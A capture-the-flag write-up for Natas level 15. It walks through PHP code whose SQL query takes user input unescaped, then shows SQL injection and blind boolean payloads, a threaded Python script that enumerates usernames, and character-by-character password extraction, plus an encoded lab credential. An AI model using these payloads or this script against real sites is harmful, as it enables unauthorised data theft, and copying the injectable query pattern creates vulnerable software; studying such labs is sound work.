# Level 15

## Software used
- Google Chrome + FoxyProxy
- Burpsuite Community
- [onlinephp.io](https://onlinephp.io/)

## Hint
```php
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas15', '<censored>');
    mysqli_select_db($link, 'natas15');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<?php } ?>
```

## Solution

### Code Analysis

```
/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/
```
It is actually a comment but it may be useful since it gives us a clue about the maximum length of usernames and passwords, and that the default value if NULL.  
[VARCHAR](https://dev.mysql.com/doc/refman/8.0/en/char.html): The CHAR and VARCHAR types are similar, but differ in the way they are stored and retrieved. They also differ in maximum length and in whether trailing spaces are retained.  
[MYSQL DEFAULT VALUE](https://dev.mysql.com/doc/refman/8.0/en/data-type-defaults.html)
```php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas15', '<censored>');
    mysqli_select_db($link, 'natas15');
```
If key _username_ exists in the special array $\_REQUEST, then connect to the database _natas15_ on localhost (local to the server) using the username _natas15_ and password... which is censored.  

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }
```
Create the variable $query which holds the actual SQL query to be sent to the backend database.  

```php
$res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>
```

The variable $res holds the response from the backend database:
- if the number of rows ([mysqli_num_rows](https://www.php.net/manual/en/mysqli-result.num-rows.php)) is greater than 0, then prints to screen ""This user exists.\<br>"
- if the number of rows is 0 or a negative integer, then prints "This user doesn't exist.\<br>"
- if the result is everything else, prints "Error in query.\<br>"

At the end of the script, the connection to the database is closed.

## Exploit

Injecting the payload `" OR 1=1-- ` the app prints to screen **This user exists.**. By contrast, using the payload `" OR 1=2-- ` we get **This user doesn't exist.**.
```php
<?php

$array = array(
	
	"username" => '" OR 1=1-- ',
	/*"password" => '" OR 1=1-- ',*/
);

$query = "SELECT * from users where username=\"".$array["username"]."\"";

echo $query

?>
_____

SELECT * from users where username="" OR 1=1-- "
```

Bruteforcing the webapp using the following script* we found out the **alice** is a valid username.

```python
import requests
import sys
import urllib3
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# PROXY ALL REQUESTS THROUGH BURP
proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}


def postRequest(s, target_url, username):
    # DEFINE ARGUMENTS TO SEND ALONG THE POST REQUEST
    params = {
        'username' : username
    }

    headers = {
        'Authorization': 'Basic bmF0YXMxNTpUVGthSTdBV0c0aURFUnp0QmNFeUtWN2tSWEgxRVpSQg=='
    }

    # SEND REQUEST
    r = s.post(target_url, headers=headers, data=params, verify=False, proxies=proxies)

    # CHECK IF USERNAME IS VALID
    if "This user exists." in r.text:
        return username, r.status_code



def main():
    if len(sys.argv) != 2:
        print("[-] Wrong number of arguments!")
        print("[-] Usage: %s <url>" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1].strip()
    s = requests.Session()

    target_url = url + '/index.php'
    usernames = []
    
    # LOAD USERNAMES IN A LIST
    with open(r'.\usernames.txt', 'r') as file:
        print("[+] Loading all usernames in a list...")
        for line in file.readlines():
            username = line.strip()
            sys.stdout.write("[+] Added username %s\r" % username)
            sys.stdout.flush()
            sys.stdout.write("\033[K")
            usernames.append(username)
        
    how_many_usernames = len(usernames)
    print("[+] All set! %i usernames loaded" % how_many_usernames)

    # START THREADED EXECUTION
    with ThreadPoolExecutor (max_workers=5) as executor:
        future_to_url = {executor.submit(postRequest, s, target_url, username) for username in usernames}
        for future in concurrent.futures.as_completed(future_to_url):
            try:
                
                    data = future.result()
                    if data:
                        print(data[0], data[1])
                

            except Exception as exc:
                print("[-] Error: %s" % exc)

if __name__ == "__main__":
    main()
```

\*This script is _raw_: it is fast but you need to kill the process to stop it.  

<img src="https://github.com/jupitersinsight/writeups/assets/110602224/0d4d4bb1-f534-4ffe-b221-1dff673f4557" width=600 height=auto>  

Double-check the script result.  

<img src="https://github.com/jupitersinsight/writeups/assets/110602224/c20e0ef8-326e-4bd7-b941-31d62b8f9542" width=900 height=auto>

Now that we have found a valid username, we need to extract its password. Once again we can infer from the error messages when our query is TRUE, when is FALSE, and even when it contains syntax errors.  

```php
 if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }
```
The source-code gives us another valuable piece of information: the php code begins checking if the key _username_ is presente in $\_REQUEST (which we know being an associative array contaning the contents of $\_GET, $\_POST, and $\_COOKIE) meaning that GET requests may be accepted. If we can actually pass the parameter through GET requests, we can add a second parameter _debug=true_ and have the application to print the query passed to the backend database.  
```php
if(array_key_exists("username", $_REQUEST))
[...]
	if(array_key_exists("debug", $_GET)) {
        	echo "Executing query: $query<br>";
    	}
```  

<img src="https://github.com/jupitersinsight/writeups/assets/110602224/cd5323a7-f20d-4e78-9428-62eda2b82b16" width=900 height=auto>

Putting all pieces together we can enumerate the password of known users one character at a time, starting from determining the actual password length.  

Payload:` ' AND (SELECT username FROM users WHERE username='alice' and LENGTH(password)>1)='alice'-- `  

<img src="https://github.com/jupitersinsight/writeups/assets/110602224/fdff36e5-cd4c-4779-bc22-276328df7928" width=900 height=auto>  

<img src="https://github.com/jupitersinsight/writeups/assets/110602224/e64a5263-a1c7-4f63-83aa-bfac8e075833" widht=900 height=auto>  

Once we know the length of the password, we can start enumerating on character at a time.  

Payload: `' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='alice')='a'-- `  

Using BurpIntruder (instructed to grep match on expression "This user exists.") we can see that the first character of the password is **h**.  

<img src="https://github.com/jupitersinsight/writeups/assets/110602224/d679ab87-9c3c-4502-beaf-da5f74896527" width=450 height=auto>  
